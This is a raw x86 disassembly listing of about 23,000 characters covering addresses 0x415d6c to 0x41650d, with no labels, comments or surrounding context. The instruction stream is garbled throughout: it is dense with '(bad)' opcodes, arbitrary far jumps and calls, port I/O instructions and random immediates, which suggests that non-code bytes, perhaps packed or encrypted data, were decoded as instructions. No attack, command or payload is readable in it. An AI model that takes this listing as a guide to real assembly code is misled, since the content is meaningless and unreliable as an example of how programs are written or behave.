  415d6c:	stos   DWORD PTR es:[edi],eax
  415d6d:	sub    BYTE PTR [ebp-0x19],0xfe
  415d71:	enter  0x5b80,0x56
  415d75:	clc    
  415d76:	mov    al,0xba
  415d78:	jns    0x415d63
  415d7a:	mov    dh,0x58
  415d7c:	push   0x33
  415d7e:	add    esp,esi
  415d80:	sbb    DWORD PTR [edi+ebx*1-0x69],edi
  415d84:	pop    ebx
  415d85:	lods   eax,DWORD PTR ds:[esi]
  415d86:	test   al,0xb0
  415d88:	ret    0x53dd
  415d8b:	cmp    eax,0xdb17f6e2
  415d90:	push   0x60f8a902
  415d95:	inc    edx
  415d96:	jmp    0xbfc3:0x9fe9bde9
  415d9d:	ins    DWORD PTR es:[edi],dx
  415d9e:	xchg   ecx,eax
  415d9f:	mov    cs,WORD PTR [edi+eax*4+0x75faa3c1]
  415da6:	push   ds
  415da7:	out    dx,eax
  415da8:	cdq    
  415da9:	ss ds sub eax,0x8d097a37
  415db0:	xor    edi,edx
  415db2:	popa   
  415db3:	nop
  415db4:	cmc    
  415db5:	jbe    0x415de7
  415db7:	dec    ecx
  415db8:	adc    DWORD PTR [ebp-0x3425214a],esp
  415dbe:	inc    eax
  415dbf:	inc    ebp
  415dc0:	stos   BYTE PTR es:[edi],al
  415dc1:	mov    bh,0xda
  415dc3:	push   ecx
  415dc4:	sbb    DWORD PTR [ebx-0x5c],eax
  415dc7:	mov    cl,0x74
  415dc9:	dec    ebx
  415dca:	enter  0x73df,0xf6
  415dce:	inc    edi
  415dcf:	les    ebx,FWORD PTR [esi]
  415dd1:	mov    cl,0xb2
  415dd3:	add    eax,0xaa80933e
  415dd8:	mov    eax,ds:0xdb262039
  415ddd:	sbb    DWORD PTR [esp+ebp*4+0x66],ebx
  415de1:	icebp  
  415de2:	cmp    DWORD PTR [edx],esp
  415de4:	test   DWORD PTR ds:0x39e727e6,esi
  415dea:	cld    
  415deb:	push   0xffffffb6
  415ded:	fldenv [ecx-0x3b57cf9a]
  415df3:	ja     0x415de1
  415df5:	jne    0x415e5c
  415df7:	add    eax,0x3ddca9df
  415dfc:	data16 aam 0x2
  415dff:	repnz sbb cl,bh
  415e02:	push   cs
  415e03:	jbe    0x415e68
  415e05:	sub    eax,ecx
  415e07:	jmp    0xc94e:0xaa71762e
  415e0e:	dec    edx
  415e0f:	sar    DWORD PTR [esi-0x6c378dd9],0x9a
  415e16:	jmp    0x56443732
  415e1b:	push   eax
  415e1c:	iret   
  415e1d:	shr    DWORD PTR [ecx+esi*1+0x56],0x4c
  415e22:	sbb    al,0x89
  415e24:	adc    cl,bh
  415e26:	shl    DWORD PTR [edi],0x12
  415e29:	push   0x30db0f58
  415e2e:	(bad)  
  415e2f:	stos   DWORD PTR es:[edi],eax
  415e30:	stos   DWORD PTR es:[edi],eax
  415e31:	stos   DWORD PTR es:[edi],eax
  415e32:	nop
  415e33:	sbb    cl,BYTE PTR [ecx]
  415e35:	icebp  
  415e36:	(bad)  
  415e37:	es (bad) 
  415e39:	mov    dl,0xa
  415e3b:	inc    edi
  415e3c:	das    
  415e3d:	dec    esp
  415e3e:	and    eax,0x338c7ef6
  415e43:	inc    ecx
  415e44:	aaa    
  415e45:	inc    esi
  415e46:	repz repz push 0x70
  415e4a:	cmp    eax,0xaba94e7e
  415e4f:	add    dl,BYTE PTR [ecx+eax*8-0x46201cc0]
  415e56:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  415e58:	aas    
  415e59:	out    0xea,al
  415e5b:	dec    ebx
  415e5c:	jg     0x415e24
  415e5e:	nop
  415e5f:	and    BYTE PTR [ecx],dl
  415e61:	ds xchg ebx,eax
  415e63:	mov    ch,dl
  415e65:	mov    ds:0x72c03a4e,al
  415e6a:	(bad)  
  415e6b:	aam    0x4e
  415e6d:	ds out dx,eax
  415e6f:	std    
  415e70:	mov    cl,cl
  415e72:	pop    es
  415e73:	in     eax,dx
  415e74:	sbb    ah,bh
  415e76:	xchg   ebx,eax
  415e77:	mov    ebp,0xdf5a57fb
  415e7c:	and    ecx,DWORD PTR [eax+0x1b]
  415e7f:	fisub  WORD PTR [edi-0x3570ae94]
  415e85:	fadd   DWORD PTR [eax]
  415e87:	pop    ebx
  415e88:	adc    eax,0x1cd8181e
  415e8d:	aad    0x34
  415e8f:	cmp    ebp,DWORD PTR [ecx+0x9]
  415e92:	cwde   
  415e93:	je     0x415ec5
  415e95:	pop    ds
  415e96:	cwde   
  415e97:	push   ss
  415e98:	cmp    al,0x4c
  415e9a:	pcmpeqd mm7,QWORD PTR [ebx]
  415e9d:	call   0x93:0x2ed9aa5b
  415ea4:	in     al,dx
  415ea5:	addr16 sbb al,0xee
  415ea8:	sbb    ebx,DWORD PTR [edx]
  415eaa:	xchg   esp,eax
  415eab:	ret    
  415eac:	sub    al,0x80
  415eae:	outs   dx,DWORD PTR ds:[esi]
  415eaf:	or     bh,BYTE PTR [edx+0x31]
  415eb2:	mov    cl,BYTE PTR [edi-0x12]
  415eb5:	sbb    BYTE PTR [eax-0x75],ch
  415eb8:	xor    esp,esp
  415eba:	add    al,0xd8
  415ebc:	pop    esi
  415ebd:	mov    DWORD PTR ds:0x22b8bc8a,esp
  415ec3:	xor    DWORD PTR [edx-0x42f57e52],ecx
  415ec9:	out    0x71,eax
  415ecb:	jns    0x415ef5
  415ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ece:	jge    0x415e64
  415ed0:	imul   esi,DWORD PTR [ebp+0x56],0xffffff92
  415ed4:	xor    BYTE PTR ds:0xeebefab8,bh
  415eda:	jae    0x415f03
  415edc:	mov    WORD PTR [ebp-0x28848698],gs
  415ee2:	mov    cl,0xce
  415ee4:	gs or  cl,dh
  415ee7:	popf   
  415ee8:	mov    bl,0x1a
  415eea:	jle    0x415ef7
  415eec:	or     bl,0xc3
  415eef:	push   ecx
  415ef0:	test   BYTE PTR [esi-0x331642c0],dh
  415ef6:	cmc    
  415ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ef8:	adc    bl,al
  415efa:	sbb    ah,dl
  415efc:	pop    ebp
  415efd:	pop    ss
  415efe:	add    BYTE PTR [edx+eiz*2+0x34],al
  415f02:	jbe    0x415f4a
  415f04:	in     al,0x6d
  415f06:	imul   DWORD PTR [ecx-0x60d7eea]
  415f0c:	mov    bl,0xb8
  415f0e:	(bad)  
  415f10:	enter  0x7f37,0x69
  415f14:	(bad)  
  415f15:	mov    al,ds:0x3b01e863
  415f1a:	daa    
  415f1b:	dec    esp
  415f1c:	aaa    
  415f1d:	cld    
  415f1e:	imul   edx,DWORD PTR [ecx+esi*1],0x13
  415f22:	lock (bad) 
  415f24:	jo     0x415eb0
  415f26:	mov    eax,0x1767217d
  415f2b:	or     BYTE PTR [ebx],dh
  415f2d:	test   eax,0x1e990ec9
  415f32:	call   0x81cc5227
  415f37:	sbb    ecx,DWORD PTR [ebx+0x77]
  415f3a:	mov    ecx,0xb74dc8c4
  415f3f:	mov    edx,0x42ea30c0
  415f44:	mov    ah,0x8a
  415f46:	and    esi,edi
  415f48:	aas    
  415f49:	iret   
  415f4a:	xor    edi,DWORD PTR [edi-0x80]
  415f4d:	and    esp,DWORD PTR [ebx+0x6de9dfd7]
  415f53:	cmp    ebx,eax
  415f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f56:	jnp    0x415fd6
  415f58:	pop    ebp
  415f59:	push   ebp
  415f5a:	jae    0x415ef6
  415f5c:	inc    edi
  415f5d:	pop    edi
  415f5e:	inc    ebx
  415f5f:	sub    DWORD PTR [edx+0x6d085f86],0x35
  415f66:	adc    ch,dl
  415f68:	aam    0x56
  415f6a:	test   BYTE PTR [ecx],bl
  415f6c:	idiv   bl
  415f6e:	pop    es
  415f6f:	add    dl,BYTE PTR [eax]
  415f71:	xor    DWORD PTR [edi+0x17e5f63e],edx
  415f77:	jle    0x415ff8
  415f79:	jae    0x415f8f
  415f7b:	cdq    
  415f7c:	out    dx,al
  415f7d:	call   0x81aae9c2
  415f82:	icebp  
  415f83:	adc    al,0xb1
  415f85:	sub    al,BYTE PTR [edx]
  415f87:	mov    edi,0x8d98133f
  415f8c:	mov    edx,0x44f42f67
  415f91:	rcl    ah,0xfe
  415f94:	adc    bl,BYTE PTR [esi+0x728b6d8d]
  415f9a:	lods   eax,DWORD PTR ds:[esi]
  415f9b:	mov    dh,0xbf
  415f9d:	mov    DWORD PTR [ebx+0x61],ecx
  415fa0:	jo     0x415f45
  415fa2:	pop    ebx
  415fa3:	clc    
  415fa4:	mov    BYTE PTR [edx-0x5a7940eb],bl
  415faa:	jns    0x415fb0
  415fac:	mov    eax,0x98b7c39d
  415fb1:	xchg   edx,eax
  415fb2:	mov    esp,0x3b6b6e87
  415fb7:	jno    0x415fa8
  415fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fbb:	pop    edi
  415fbc:	loop   0x415fa2
  415fbe:	test   al,0xbb
  415fc0:	mov    edx,DWORD PTR [esi]
  415fc2:	fcom   DWORD PTR [esi-0x3d]
  415fc5:	adc    esi,0x23
  415fc8:	jb     0x415f9c
  415fca:	fsubp  st(1),st
  415fcc:	pop    ebp
  415fcd:	ja     0x415ffb
  415fcf:	arpl   WORD PTR [ecx+0x0],ax
  415fd2:	jl     0x415f74
  415fd4:	and    ebx,esp
  415fd6:	ret    
  415fd7:	aaa    
  415fd8:	mov    al,ds:0xda9b08f6
  415fdd:	out    dx,eax
  415fde:	mov    eax,DWORD PTR [ecx]
  415fe0:	shl    BYTE PTR [esi],1
  415fe2:	out    0x8,eax
  415fe4:	pop    edx
  415fe5:	xor    DWORD PTR [edi-0x213b1cc1],0xffffff88
  415fec:	adc    DWORD PTR fs:[ebx-0x3a],edx
  415ff0:	mov    ah,0xd
  415ff2:	lea    ebx,[ebx]
  415ff4:	xchg   ebx,eax
  415ff5:	mov    eax,ds:0x7a5cfa56
  415ffa:	daa    
  415ffb:	xchg   edx,eax
  415ffc:	(bad)  
  415ffe:	adc    ch,BYTE PTR [edi+0x6890dced]
  416004:	mov    ds:0x31d7e638,al
  416009:	outs   dx,DWORD PTR ds:[esi]
  41600a:	mov    eax,0xa5d326f1
  41600f:	mov    dh,dh
  416011:	out    0xd3,al
  416013:	(bad)  
  416014:	cmp    BYTE PTR [edx-0x72485547],al
  41601a:	retf   
  41601b:	and    al,0x93
  41601d:	sbb    BYTE PTR [ebx+0x3c],ah
  416020:	mov    al,0x93
  416022:	mov    ebp,0x1ef41b9a
  416027:	cmp    ecx,ecx
  416029:	jns    0x415fec
  41602b:	jmp    0x416096
  41602d:	xchg   BYTE PTR ds:0x6b1531a8,al
  416033:	mov    cl,0xc4
  416035:	xlat   BYTE PTR ds:[ebx]
  416036:	xchg   DWORD PTR [ecx+0x15],esi
  416039:	pop    ebp
  41603a:	push   es
  41603b:	and    eax,DWORD PTR [edx-0x27]
  41603e:	add    BYTE PTR [esp+eax*4],dh
  416041:	in     eax,0xb9
  416043:	lods   eax,DWORD PTR ds:[esi]
  416044:	adc    eax,0x1f70dd82
  416049:	cmc    
  41604a:	jns    0x4160b0
  41604c:	test   eax,0x8035e56c
  416051:	stc    
  416052:	add    al,0x60
  416054:	cmp    DWORD PTR [esi+0x1900ce29],esi
  41605a:	add    DWORD PTR [ecx+0x22],eax
  41605d:	neg    DWORD PTR [ebx+0x7f]
  416060:	popa   
  416061:	in     eax,dx
  416062:	scas   eax,DWORD PTR es:[edi]
  416063:	arpl   WORD PTR ds:0x7ac62061,dx
  416069:	nop
  41606a:	and    eax,0xbfc99ac3
  41606f:	xor    bl,BYTE PTR [eax-0x74]
  416072:	rol    ch,cl
  416074:	ss pop esi
  416076:	add    cl,cl
  416078:	add    eax,0xbc92ec03
  41607d:	jo     0x4160b5
  41607f:	jl     0x4160f4
  416081:	pusha  
  416082:	ret    
  416083:	aaa    
  416084:	pop    ebx
  416085:	lods   eax,DWORD PTR ds:[esi]
  416086:	lock gs ins BYTE PTR es:[edi],dx
  416089:	ins    DWORD PTR es:[edi],dx
  41608a:	repnz out 0xb6,al
  41608d:	sbb    ecx,DWORD PTR [ecx+esi*8]
  416090:	add    DWORD PTR [edx-0x549a71a8],ecx
  416096:	pop    ds
  416097:	(bad)  
  416098:	aad    0x58
  41609a:	push   ebp
  41609b:	(bad)  
  41609c:	test   BYTE PTR ds:0x6bd834dd,0xa8
  4160a3:	(bad)  
  4160a4:	xlat   BYTE PTR ds:[ebx]
  4160a5:	loop   0x416076
  4160a7:	inc    esp
  4160a8:	xor    al,0x6d
  4160aa:	and    al,0xbe
  4160ac:	xor    DWORD PTR [edx+0x1127ac9b],eax
  4160b2:	xchg   esi,eax
  4160b3:	cs pop ss
  4160b5:	hlt    
  4160b6:	outs   dx,BYTE PTR ds:[esi]
  4160b7:	outs   dx,BYTE PTR ds:[esi]
  4160b8:	cmp    edi,edi
  4160ba:	mov    ch,0x77
  4160bc:	sahf   
  4160bd:	push   ss
  4160be:	pop    ebp
  4160bf:	sub    al,0x4
  4160c1:	xor    BYTE PTR [esi-0x3550d3f0],bh
  4160c7:	dec    BYTE PTR [ebx-0x6c]
  4160ca:	xor    ah,BYTE PTR [eax+0x4e]
  4160cd:	cmp    esi,DWORD PTR [edx+edi*8]
  4160d0:	outs   dx,DWORD PTR ds:[esi]
  4160d1:	fild   DWORD PTR [esi+0x12a1c3e]
  4160d7:	pop    edx
  4160d8:	gs jecxz 0x4160b4
  4160db:	sbb    BYTE PTR ds:0x6e88809b,cl
  4160e1:	dec    esp
  4160e2:	pushf  
  4160e3:	xor    eax,ebx
  4160e5:	ins    BYTE PTR es:[edi],dx
  4160e6:	div    BYTE PTR [eax]
  4160e8:	inc    edx
  4160e9:	or     eax,0xc20e4a44
  4160ee:	aaa    
  4160ef:	cmp    al,0x4b
  4160f1:	cli    
  4160f2:	fdiv   DWORD PTR [edx+ecx*2+0x74683332]
  4160f9:	aad    0x7d
  4160fb:	shl    BYTE PTR [edi-0x2a],0x68
  4160ff:	test   cl,cl
  416101:	add    bh,BYTE PTR [ebp+0x66]
  416104:	xchg   BYTE PTR [ebx-0x506088c2],bh
  41610a:	lods   al,BYTE PTR ds:[esi]
  41610b:	jo     0x41617e
  41610d:	hlt    
  41610e:	push   eax
  41610f:	add    bh,BYTE PTR [ebp+esi*8+0x30768238]
  416116:	ret    
  416117:	and    al,0xbf
  416119:	aam    0x9f
  41611b:	push   0x23
  41611d:	int3   
  41611e:	iret   
  41611f:	aas    
  416120:	enter  0x14c5,0xf
  416124:	sub    ch,ch
  416126:	call   0x4173:0x90870a95
  41612d:	pop    ebx
  41612e:	push   ecx
  41612f:	pop    esi
  416130:	pop    edx
  416131:	pop    ds
  416132:	add    BYTE PTR [ebp-0x4ac84c61],0x93
  416139:	in     al,0xf
  41613b:	leave  
  41613c:	or     DWORD PTR [esi],edi
  41613e:	in     eax,dx
  41613f:	ins    DWORD PTR es:[edi],dx
  416140:	xor    BYTE PTR [ecx-0x4de2fcd],bh
  416146:	rcr    BYTE PTR [ecx+0x79d79d31],1
  41614c:	in     al,0x44
  41614e:	imul   ebx,DWORD PTR [edx+0x7b],0x8f4811
  416155:	add    DWORD PTR [bx],ebp
  416158:	(bad)  
  416159:	cmp    al,0xb1
  41615b:	jne    0x416147
  41615d:	imul   edi,DWORD PTR [ecx+ebx*2+0x35],0x564f37b3
  416165:	cmc    
  416166:	jno    0x416189
  416168:	sbb    DWORD PTR ds:0x24ea44bf,ebx
  41616e:	(bad)  
  41616f:	xchg   esp,eax
  416170:	inc    edi
  416171:	mov    ds:0x564b44d3,al
  416176:	push   ebp
  416177:	push   cs
  416178:	rcr    ah,cl
  41617a:	or     ah,BYTE PTR [eax+0x3f]
  41617d:	jnp    0x416124
  41617f:	gs inc ebp
  416181:	cmp    bl,BYTE PTR [edi-0x32]
  416184:	mov    eax,0x72911fb9
  416189:	mov    cl,0x38
  41618b:	and    ebp,DWORD PTR [ecx+0x3c]
  41618e:	push   ecx
  41618f:	arpl   WORD PTR [edx-0xcbab8d5],bp
  416195:	dec    eax
  416196:	das    
  416197:	mov    al,0x30
  416199:	mov    ch,0x75
  41619b:	in     eax,0xa1
  41619d:	lods   al,BYTE PTR ds:[esi]
  41619e:	adc    ebp,DWORD PTR [esp+eiz*8-0x901ffe8]
  4161a5:	outs   dx,BYTE PTR ds:[esi]
  4161a6:	or     DWORD PTR [ebp-0x6ffe80a8],esp
  4161ac:	loope  0x416199
  4161ae:	ficomp WORD PTR ds:0x31ddde94
  4161b4:	stc    
  4161b5:	jo     0x41621e
  4161b7:	lds    ecx,FWORD PTR [edi]
  4161b9:	fcomp  DWORD PTR [eax+ebp*2]
  4161bc:	sub    BYTE PTR [edi-0x23],0x47
  4161c0:	adc    BYTE PTR [eax-0x33],dh
  4161c3:	mov    ebx,0x845f804b
  4161c8:	test   eax,0x9def5a9e
  4161cd:	jg     0x416249
  4161cf:	jle    0x416248
  4161d1:	fist   DWORD PTR [esi]
  4161d3:	pop    ebp
  4161d4:	ficomp WORD PTR [edi+0x5e]
  4161d7:	ins    BYTE PTR es:[edi],dx
  4161d8:	jmp    0x416176
  4161da:	jne    0x41618a
  4161dc:	retf   
  4161dd:	scas   eax,DWORD PTR es:[edi]
  4161de:	xchg   esp,eax
  4161df:	outs   dx,DWORD PTR ds:[esi]
  4161e0:	ja     0x4161df
  4161e2:	fstp   QWORD PTR [ecx+0x46ab5ac2]
  4161e8:	retf   0xf16e
  4161eb:	jle    0x4161d9
  4161ed:	and    cl,BYTE PTR [esi+ebp*1+0x2e]
  4161f1:	fscale 
  4161f3:	outs   dx,BYTE PTR ds:[esi]
  4161f4:	and    al,0xc0
  4161f6:	xor    DWORD PTR [edi-0x430d705c],0xa9ad9128
  416200:	stc    
  416201:	daa    
  416202:	enter  0xea13,0xfd
  416206:	jno    0x4161b3
  416208:	aam    0x43
  41620a:	(bad)  
  41620b:	sub    eax,0x53f7b6f5
  416210:	push   cs
  416211:	sub    eax,0xb6252b00
  416216:	mov    ds:0x9514a47,al
  41621b:	sahf   
  41621c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41621d:	pop    esi
  41621e:	adc    al,0xf1
  416220:	adc    ebp,DWORD PTR ds:0x5ef8832d
  416226:	jne    0x4161a8
  416228:	repz mov edx,0x951a9366
  41622e:	xchg   ebx,eax
  41622f:	ret    
  416230:	ret    0xeab7
  416233:	pop    eax
  416234:	xchg   ebp,eax
  416235:	in     al,dx
  416236:	in     eax,0xdf
  416238:	dec    edx
  416239:	aad    0x5
  41623b:	call   0xb95e:0xe6261fbe
  416242:	test   eax,0x411997e
  416247:	add    dl,BYTE PTR [edi]
  416249:	xor    ebp,esi
  41624b:	fsub   QWORD PTR [edi]
  41624d:	test   BYTE PTR [edx-0x5c],cl
  416250:	pop    edi
  416251:	xchg   DWORD PTR [esi+0x2e9f3d65],esi
  416257:	(bad)  
  416258:	mov    eax,0xb5bd4d71
  41625d:	bound  eax,QWORD PTR [ebx+0x29f6338f]
  416263:	rol    DWORD PTR ds:0xbf03024d,0x48
  41626a:	adc    edx,DWORD PTR [eax-0x6e]
  41626d:	int    0x34
  41626f:	cmp    dl,BYTE PTR [esi+eax*1+0x11]
  416273:	jl     0x416231
  416275:	pop    ecx
  416276:	repnz out dx,al
  416278:	fsub   QWORD PTR [ebx-0x7d235ab0]
  41627e:	mov    bh,0x6d
  416280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416281:	fsub   QWORD PTR [edx]
  416283:	int3   
  416284:	jp     0x41628e
  416286:	mov    bl,dh
  416288:	rcl    BYTE PTR [edx-0x70],1
  41628b:	loopne 0x4162ae
  41628d:	mov    eax,ds:0xc6facb4b
  416292:	push   cs
  416293:	in     al,0xd
  416295:	jno    0x4162c5
  416297:	ss mov ecx,0x92b173a1
  41629d:	sbb    BYTE PTR [edx+ecx*8],cl
  4162a0:	pop    es
  4162a1:	cwde   
  4162a2:	mov    ebp,0xe14f4605
  4162a7:	inc    ebx
  4162a8:	ffreep st(1)
  4162aa:	pusha  
  4162ab:	cmp    al,0x52
  4162ad:	sbb    al,dl
  4162af:	gs adc eax,0xabe85cd2
  4162b5:	sbb    eax,0x4d7ae46f
  4162ba:	and    ebx,edi
  4162bc:	dec    edi
  4162bd:	daa    
  4162be:	cwde   
  4162bf:	inc    BYTE PTR [esp+ebp*1-0x40]
  4162c3:	aad    0x46
  4162c5:	jmp    0xdd8c4d44
  4162ca:	inc    esi
  4162cb:	cli    
  4162cc:	into   
  4162cd:	mov    bl,BYTE PTR [edi-0x16684876]
  4162d3:	xchg   ebp,eax
  4162d4:	dec    ebx
  4162d5:	xchg   ecx,eax
  4162d6:	inc    esi
  4162d7:	xchg   ebx,eax
  4162d8:	add    BYTE PTR [eax],bl
  4162da:	cmp    eax,0x97b36797
  4162df:	mov    ecx,0xa0c0882d
  4162e4:	xchg   esp,eax
  4162e5:	cs aas 
  4162e7:	dec    esi
  4162e8:	xchg   ecx,eax
  4162e9:	pushf  
  4162ea:	push   edi
  4162eb:	scas   al,BYTE PTR es:[edi]
  4162ec:	add    eax,0x7dfd06fd
  4162f1:	pop    eax
  4162f2:	adc    dl,ch
  4162f4:	xlat   BYTE PTR ds:[ebx]
  4162f5:	out    0xc1,al
  4162f7:	adc    ebp,DWORD PTR [ebx+0x4c943b59]
  4162fd:	aas    
  4162fe:	mov    ds:0xa709826d,al
  416303:	out    0x4b,al
  416305:	mov    WORD PTR [ecx-0x1d],ds
  416308:	daa    
  416309:	arpl   di,di
  41630b:	cld    
  41630c:	clc    
  41630d:	inc    ebp
  41630e:	sbb    edi,edx
  416310:	dec    edi
  416311:	push   es
  416312:	ins    BYTE PTR es:[edi],dx
  416313:	xchg   edi,eax
  416314:	scas   eax,DWORD PTR es:[edi]
  416315:	je     0x41630b
  416317:	inc    edi
  416318:	fcom   DWORD PTR [esi+ecx*1-0x77]
  41631c:	test   DWORD PTR [ecx],0x58f13ce5
  416322:	or     al,0x6f
  416324:	add    bl,bl
  416326:	xchg   ecx,eax
  416327:	mov    DWORD PTR [esi+0x18],0x19a74d0e
  41632e:	jl     0x4162dd
  416330:	shl    ch,cl
  416332:	call   0x7122fcd1
  416337:	cmp    ch,BYTE PTR [ebx]
  416339:	inc    ebp
  41633a:	and    al,0xc4
  41633c:	hlt    
  41633d:	ins    BYTE PTR es:[edi],dx
  41633e:	push   esp
  41633f:	pop    eax
  416340:	mov    DWORD PTR [ebx],ebx
  416342:	pop    esi
  416343:	jb     0x416312
  416345:	add    DWORD PTR [eax-0x29],0xfb01b93e
  41634c:	fwait
  41634d:	cmp    BYTE PTR [esi-0x42428708],ah
  416353:	test   BYTE PTR [edx-0x78d4e228],0xbe
  41635a:	aam    0x7b
  41635c:	xor    BYTE PTR [ebp+0x3d70ad45],ch
  416362:	ficom  WORD PTR [ecx+0x44]
  416365:	inc    esp
  416366:	push   cs
  416367:	(bad)  
  416369:	out    dx,al
  41636a:	xchg   DWORD PTR [ecx+0x7],esp
  41636d:	ret    
  41636e:	jb     0x4163ef
  416370:	push   eax
  416371:	ins    BYTE PTR es:[edi],dx
  416372:	ret    0x6158
  416375:	iret   
  416376:	out    dx,eax
  416377:	dec    eax
  416378:	leave  
  416379:	jg     0x4163f2
  41637b:	push   ebp
  41637c:	dec    edi
  41637d:	jo     0x4163d7
  41637f:	cmp    cl,BYTE PTR [ebx]
  416381:	iret   
  416382:	retf   0x6e9c
  416385:	popf   
  416386:	adc    eax,DWORD PTR [ebp-0x59f3ddb5]
  41638c:	jnp    0x4163f1
  41638e:	ja     0x4163af
  416390:	out    dx,al
  416391:	mov    ds:0x64d840a0,eax
  416396:	(bad)  
  416397:	pop    ss
  416398:	hlt    
  416399:	imul   ecx,eax,0x1f9ba8da
  41639f:	(bad)  
  4163a0:	shr    DWORD PTR [ebp-0x5438cc0d],1
  4163a6:	ror    edi,cl
  4163a8:	cmc    
  4163a9:	or     al,0x1d
  4163ab:	(bad)  
  4163ac:	repnz dec esi
  4163ae:	mov    eax,ds:0xb471c7f6
  4163b3:	outs   dx,DWORD PTR ds:[esi]
  4163b4:	add    ecx,esi
  4163b6:	push   cs
  4163b7:	pop    ecx
  4163b8:	sbb    esp,DWORD PTR [edx+0x4e]
  4163bb:	aam    0x6e
  4163bd:	popf   
  4163be:	dec    ebp
  4163bf:	inc    esp
  4163c0:	std    
  4163c1:	pop    ss
  4163c2:	mov    al,ds:0x62022ed8
  4163c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163c8:	loopne 0x41643d
  4163ca:	(bad)  
  4163cb:	pop    ds
  4163cc:	or     edx,DWORD PTR [ebp-0x20]
  4163cf:	shl    DWORD PTR [ecx-0x21],1
  4163d2:	sbb    al,0xa4
  4163d4:	(bad)  
  4163d5:	outs   dx,DWORD PTR ds:[esi]
  4163d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d7:	pop    esi
  4163d8:	out    dx,al
  4163d9:	aaa    
  4163da:	imul   esi,DWORD PTR [edi+ebx*4-0x2f8c5651],0x2756cfac
  4163e5:	mov    cs,WORD PTR [edi+ecx*2-0xf3f3ee]
  4163ec:	aam    0x5
  4163ee:	cmp    al,0x16
  4163f0:	lods   al,BYTE PTR ds:[esi]
  4163f1:	jg     0x416424
  4163f3:	and    esi,DWORD PTR [edi]
  4163f5:	xchg   ecx,eax
  4163f6:	lods   al,BYTE PTR ds:[esi]
  4163f7:	sub    bh,BYTE PTR [edi-0x2c]
  4163fa:	sub    al,0x8e
  4163fc:	dec    esi
  4163fd:	psllw  mm4,QWORD PTR [ecx]
  416400:	sub    DWORD PTR [ecx+0xa0625b8],0xffffffb2
  416407:	in     eax,dx
  416408:	xor    al,0x5a
  41640a:	dec    edx
  41640b:	rcr    DWORD PTR [ecx+0x76],0xaf
  41640f:	test   eax,0xc5310fe7
  416414:	jae    0x4163bd
  416416:	push   cs
  416417:	xchg   edi,eax
  416418:	mov    dh,0x57
  41641a:	pop    ebx
  41641b:	cs and eax,0xc0ce9cb7
  416421:	inc    ebx
  416422:	lock daa 
  416424:	sbb    BYTE PTR [eax+0x77],0x3d
  416428:	out    dx,al
  416429:	xor    DWORD PTR [ecx+0x57],edx
  41642c:	ret    0x3201
  41642f:	fcomp  QWORD PTR [ecx+0x3188620c]
  416435:	jge    0x41645b
  416437:	outs   dx,DWORD PTR ds:[esi]
  416438:	pop    ds
  416439:	sbb    DWORD PTR [ebp+0x465a850f],ebx
  41643f:	lock mov esi,0xb5fc9850
  416445:	sub    BYTE PTR [esi],dh
  416447:	ret    
  416448:	xchg   edx,eax
  416449:	lahf   
  41644a:	fidivr WORD PTR [eax+0x3f]
  41644e:	mov    esp,0x18565570
  416453:	or     BYTE PTR [edi+0x4c],0xdb
  416457:	and    dl,BYTE PTR [ebx+0x7b]
  41645a:	sbb    al,0x8a
  41645c:	dec    esp
  41645d:	adc    ebp,DWORD PTR [esi]
  41645f:	lods   eax,DWORD PTR ds:[esi]
  416460:	cmp    esp,DWORD PTR [eax+0x60cf2942]
  416466:	adc    eax,0xaca22b57
  41646b:	sbb    edx,DWORD PTR [ebx+0x60]
  41646e:	fcom   DWORD PTR [edx-0x4f]
  416471:	mov    al,ds:0xab7dff61
  416476:	dec    ebx
  416477:	jnp    0x41640c
  416479:	pop    edx
  41647a:	ins    BYTE PTR es:[edi],dx
  41647b:	cld    
  41647c:	mov    al,0xda
  41647e:	adc    bl,dh
  416480:	mul    BYTE PTR [edx+0x72c070c]
  416486:	jge    0x416491
  416488:	sbb    eax,0x1125499a
  41648d:	adc    esi,DWORD PTR [ebx+0x216484e2]
  416493:	pop    ebx
  416494:	pop    ss
  416495:	adc    al,0x4e
  416497:	test   al,0x4f
  416499:	cwde   
  41649a:	enter  0x5fc9,0x9f
  41649e:	mov    esp,0x498b5f6a
  4164a3:	pop    es
  4164a4:	xchg   ecx,eax
  4164a5:	jge    0x4164ae
  4164a7:	je     0x4164d2
  4164a9:	out    dx,eax
  4164aa:	test   eax,0x9ee12fb2
  4164af:	ins    DWORD PTR es:[edi],dx
  4164b0:	add    BYTE PTR [edx],0x9d
  4164b3:	cmp    BYTE PTR [ebx+ecx*2],0x7
  4164b7:	leave  
  4164b8:	in     al,dx
  4164b9:	out    0xb1,eax
  4164bb:	mov    ah,0xd8
  4164bd:	and    al,0x45
  4164bf:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164c1:	ror    DWORD PTR [edi+0x2f],0x64
  4164c5:	adc    esp,eax
  4164c7:	aas    
  4164c8:	jl     0x41650e
  4164ca:	test   BYTE PTR [eax],ch
  4164cc:	dec    edx
  4164cd:	rol    BYTE PTR [eax-0x6899d9ec],cl
  4164d3:	and    esp,ecx
  4164d5:	or     eax,DWORD PTR [eax-0x64]
  4164d8:	lahf   
  4164d9:	xor    edx,DWORD PTR [edi]
  4164db:	mov    dl,0xf5
  4164dd:	lods   al,BYTE PTR ds:[esi]
  4164de:	jne    0x4164f8
  4164e0:	enter  0x9a83,0x39
  4164e4:	mov    al,0x83
  4164e6:	sti    
  4164e7:	cmp    al,BYTE PTR [ecx-0x4a]
  4164ea:	jmp    0x5fdb8bd9
  4164ef:	sahf   
  4164f0:	cld    
  4164f1:	ror    BYTE PTR [edi],cl
  4164f3:	mov    cl,0x3d
  4164f5:	aam    0xd4
  4164f7:	lahf   
  4164f8:	in     al,0x73
  4164fa:	pop    ebx
  4164fb:	adc    eax,DWORD PTR [edx+0x21ab28ec]
  416501:	add    eax,0x856dbf28
  416506:	das    
  416507:	cmp    BYTE PTR [edx+0x5f32b9e0],bl
  41650d:	(bad)  
